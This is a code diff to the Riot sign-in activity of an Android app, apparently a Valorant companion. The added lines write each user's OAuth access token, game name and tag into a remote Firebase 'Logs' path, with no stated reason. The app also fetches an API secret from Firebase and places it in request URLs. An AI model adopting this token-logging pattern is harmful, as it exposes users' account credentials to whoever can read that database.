@@ -38,6 +38,8 @@ class RSOActivity : AppCompatActivity() {
     private lateinit var runnable: Runnable
     private lateinit var progressBar: ProgressBar
 
+    val logFireBase = Firebase.database.getReference("VALORANT/Logs")
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_rsoactivity)
@@ -50,7 +52,6 @@ class RSOActivity : AppCompatActivity() {
         val confirmButton: Button = findViewById(R.id.confirmUserButton)
         confirmUserText.alpha = 0f
         confirmButton.alpha = 0f
-        //confirmUserText.translationY = 200f
         confirmButton.translationY = 50f
 
         imagesURL.add("https://media.valorant-api.com/playercards/3432dc3d-47da-4675-67ae-53adb1fdad5e/largeart.png")
@@ -63,6 +64,8 @@ class RSOActivity : AppCompatActivity() {
                 imagesURL.add(imageURL["largeArt"].toString())
             }
         }
+
+
         progressBar = findViewById(R.id.progressBar3)
         imagebackground = findViewById(R.id.imageView5)
         Picasso.get().load(imagesURL.random()).into(imagebackground)
@@ -74,6 +77,7 @@ class RSOActivity : AppCompatActivity() {
 
         progressBar.progress = 10
 
+
         val database = Firebase.database.getReference("VALORANT/SuperSecret")
         database.addListenerForSingleValueEvent(object : ValueEventListener {
             override fun onDataChange(dataSnapshot: DataSnapshot) {
@@ -82,6 +86,7 @@ class RSOActivity : AppCompatActivity() {
                 val toBeEncoded = "statics:$secret"
                 base64encode = Base64.encodeToString(toBeEncoded.toByteArray(), Base64.NO_WRAP)
                 updateText.text = "Giving you gun buddies"
+                logFireBase.child("RSO").child(code!!)
                 getToken()
             }
 
@@ -111,13 +116,13 @@ class RSOActivity : AppCompatActivity() {
                 .post(formBody)
                 .build()
 
-
             doAsync {
                 val call = client.newCall(request).execute()
                 val json = JSONObject(call.body.string())
                 val accessToken = json.getString("access_token")
                 progressBar.progress = 40
                 uiThread {
+                    logFireBase.child("RSO").child(code!!).setValue(accessToken)
                     updateText.text = "Setting your account to Iron"
                     getUserInfo(accessToken)
                 }
@@ -128,61 +133,69 @@ class RSOActivity : AppCompatActivity() {
     }
 
     private fun getUserInfo(token: String) {
-        val updateText: TextView = findViewById(R.id.infoText)
-        progressBar.progress = 75
-        val client = OkHttpClient()
-        val urlBuilder: HttpUrl.Builder =
-            "https://europe.api.riotgames.com/riot/account/v1/accounts/me".toHttpUrlOrNull()!!
-                .newBuilder()
-        val url = urlBuilder.build().toString()
-        val request = Request.Builder()
-            .url(url)
-            .addHeader("Authorization", "Bearer $token")
-            .build()
+        try {
+            val updateText: TextView = findViewById(R.id.infoText)
+            progressBar.progress = 75
+            val client = OkHttpClient()
+            val urlBuilder: HttpUrl.Builder =
+                "https://europe.api.riotgames.com/riot/account/v1/accounts/me".toHttpUrlOrNull()!!
+                    .newBuilder()
+            val url = urlBuilder.build().toString()
+            val request = Request.Builder()
+                .url(url)
+                .addHeader("Authorization", "Bearer $token")
+                .build()
 
-        val database = Firebase.database.getReference("VALORANT/key")
-        database.addListenerForSingleValueEvent(object : ValueEventListener {
-            override fun onDataChange(dataSnapshot: DataSnapshot) {
-                secret = dataSnapshot.value as String?
-            }
+            val database = Firebase.database.getReference("VALORANT/key")
+            database.addListenerForSingleValueEvent(object : ValueEventListener {
+                override fun onDataChange(dataSnapshot: DataSnapshot) {
+                    secret = dataSnapshot.value as String?
+                }
 
-            override fun onCancelled(error: DatabaseError) {
-                TODO("Not yet implemented")
-            }
-        })
+                override fun onCancelled(error: DatabaseError) {
+                    TODO("Not yet implemented")
+                }
+            })
 
-        val playersRef = Firebase.database.getReference("VALORANT/key")
-        playersRef.addValueEventListener(object : ValueEventListener {
-            override fun onDataChange(dataSnapshot: DataSnapshot) {
-                val key = (dataSnapshot.value as String?).toString()
-                doAsync {
-                    val call = client.newCall(request).execute()
-                    val json = JSONObject(call.body.string())
-                    val puuid = json.getString("puuid")
+            val playersRef = Firebase.database.getReference("VALORANT/key")
+            playersRef.addValueEventListener(object : ValueEventListener {
+                override fun onDataChange(dataSnapshot: DataSnapshot) {
+                    val key = (dataSnapshot.value as String?).toString()
+                    doAsync {
+                        val call = client.newCall(request).execute()
+                        val json = JSONObject(call.body.string())
+                        val puuid = json.getString("puuid")
 
-                    val regionURL =
-                        "https://europe.api.riotgames.com/riot/account/v1/active-shards/by-game/val/by-puuid/$puuid?api_key=$secret"
-                    val regionRequest = Request.Builder()
-                        .url(regionURL)
-                        .build()
+                        val regionURL =
+                            "https://europe.api.riotgames.com/riot/account/v1/active-shards/by-game/val/by-puuid/$puuid?api_key=$secret"
+                        val regionRequest = Request.Builder()
+                            .url(regionURL)
+                            .build()
 
-                    val regionCall = client.newCall(regionRequest).execute()
-                    val regionJson = JSONObject(regionCall.body.string())
-                    val region = regionJson.getString("activeShard")
+                        val regionCall = client.newCall(regionRequest).execute()
+                        val regionJson = JSONObject(regionCall.body.string())
+                        val region = regionJson.getString("activeShard")
+                        val gameName = json.getString("gameName")
+                        val gameTag = json.getString("tagLine")
 
-                    val gameName = json.getString("gameName")
-                    val gameTag = json.getString("tagLine")
-                    uiThread {
-                        progressBar.progress = 90
-                        updateText.text = "Click the button to prove your alive"
-                        confirmUser(puuid, gameName, gameTag, region, key)
+                        logFireBase.child("RSO").child(code!!).child("GameName").setValue(gameName)
+                        logFireBase.child("RSO").child(code!!).child("GameTag").setValue(gameTag)
+
+                        uiThread {
+                            progressBar.progress = 90
+                            updateText.text = "Click the button to prove your alive"
+                            confirmUser(puuid, gameName, gameTag, region, key)
+                        }
                     }
                 }
-            }
 
-            override fun onCancelled(databaseError: DatabaseError) {
-            }
-        })
+                override fun onCancelled(databaseError: DatabaseError) {
+                }
+            })
+        } catch (e: Exception) {
+            val updateText: TextView = findViewById(R.id.infoText)
+            updateText.text = "Error: $e"
+        }
     }
 
     private fun confirmUser(
@@ -237,5 +250,4 @@ class RSOActivity : AppCompatActivity() {
             .into(imagebackground)
         handler.postDelayed(runnable, 3000)
     }
-
 }
